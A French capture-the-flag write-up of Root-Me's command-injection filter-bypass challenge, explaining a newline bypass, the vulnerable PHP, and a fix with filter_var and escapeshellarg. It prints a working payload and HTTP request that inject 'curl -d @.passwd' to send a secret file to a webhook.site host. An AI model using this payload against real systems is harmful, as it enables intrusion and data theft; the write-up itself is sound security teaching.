# Challenge 8 : Command Injection - Filter Bypass

## Informations

**Plateforme** : Root-Me
**URL** : [https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)
**Categorie** : Command Injection
**Difficulte** : Intermediaire

## Objectif

Contourner les filtres de validation d'entrée (qui bloquent les séparateurs classiques comme `;` ou `|`) pour exécuter des commandes système et exfiltrer le contenu du fichier caché `.passwd`.

## Reconnaissance

1.  **Analyse de l'interface** : L'application propose un formulaire pour "Pinger" une adresse IP.
2.  **Test de comportement** :
      * Une IP valide renvoie le résultat du ping.
      * L'ajout de caractères spéciaux classiques (`; ls`, `| cat`) semble filtré ou ne retourne rien.
3.  **Identification du vecteur** : Puisque l'affichage direct du résultat de la commande injectée semble compromis ou filtré, nous optons pour une approche **Out-of-Band (OOB)** pour exfiltrer les données vers un serveur externe.

## Methode d'exploitation

1.  **Préparation** : Mise en place d'un "listener" sur [Webhook.site](https://webhook.site) pour recevoir les requêtes HTTP sortantes du serveur vulnérable.
2.  **Contournement** : Utilisation du caractère de saut de ligne (`%0A`) au lieu des séparateurs classiques pour chaîner les commandes.
3.  **Exfiltration** : Utilisation de la commande `curl` avec l'option `-d @fichier` pour lire un fichier local et l'envoyer en POST vers notre Webhook.
4.  **Exécution** :
      * *Payload 1* : Lecture de `index.php` pour trouver le chemin du flag.
      * *Payload 2* : Lecture de `.passwd` pour récupérer le flag.

## Payload utilise

Payload final pour récupérer le flag (encodé pour l'URL) :

```bash
ip=127.0.0.1%0Acurl%20-d%20@.passwd%20https://webhook.site/VOTRE-UUID
```

Version lisible (décodée) :

```bash
127.0.0.1
curl -d @.passwd https://webhook.site/VOTRE-UUID
```

## Requete HTTP

```http
POST /index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: [Length]

ip=127.0.0.1%0Acurl%20-d%20@.passwd%20https://webhook.site/VOTRE-UUID
```

## Explication

Le serveur s'attend à recevoir une IP pour la passer à une commande système (probablement `ping`).
Il applique un filtre sur les caractères comme `;`, `&`, et `|` pour empêcher l'injection de commandes. Cependant, il omet de filtrer le **saut de ligne** (`\n` ou `%0A` en URL encoding).

Dans un shell Linux, un saut de ligne valide la commande en cours et permet d'en exécuter une nouvelle juste après.
Nous injectons donc :

1.  Une IP valide (`127.0.0.1`) pour que la première commande `ping` réussisse.
2.  Un saut de ligne (`%0A`).
3.  Notre commande malveillante `curl` qui lit le fichier `.passwd` et l'envoie à notre serveur.

## Techniques de bypass testees

  - [x] Separateurs: `%0A` (Newline) a fonctionné. `;`, `|`, `&&` étaient bloqués.
  - [ ] Variables d'environnement: $IFS
  - [ ] Encodage: Base64, Hex
  - [ ] Wildcards: \* ? []
  - [x] Autres: Exfiltration Out-of-Band (OOB) via `curl -d @file`.

## Screenshots

  - `initial_test.png` : Réponse normale du ping sur 127.0.0.1.
  - `bypass.png` : Injection du payload dans la requête POST via F12.
  - `command_output.png` : Réception de la requête sur Webhook.site.
  - `flag.png` : Contenu du fichier .passwd visible dans le body de la requête Webhook.

## Code vulnerable

Reconstitution basée sur l'exfiltration de `index.php` :

```php
<?php
$flag = "".file_get_contents(".passwd").""; // Le fichier cible identifié
$ip = $_POST['ip'];

// Filtre incomplet (exemple théorique)
if(preg_match('/[;|&]/', $ip)) {
    die("Caractère interdit !");
}

// Injection possible grâce au manque de filtre sur \n
system("ping -c 1 " . $ip);
?>
```

## Correction recommandee

```php
<?php
$ip = $_POST['ip'];

// Utilisation de filter_var pour valider strictement le format IP
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // escapeshellarg() pour sécuriser l'argument avant de le passer au shell
    system("ping -c 1 " . escapeshellarg($ip));
} else {
    echo "IP invalide.";
}
?>
```

## Mesures de securisation

1.  **Eviter d'executer des commandes systeme** : Utiliser des fonctions PHP natives (ex: `fsockopen` ou bibliothèques réseau) au lieu de `system()`.
    2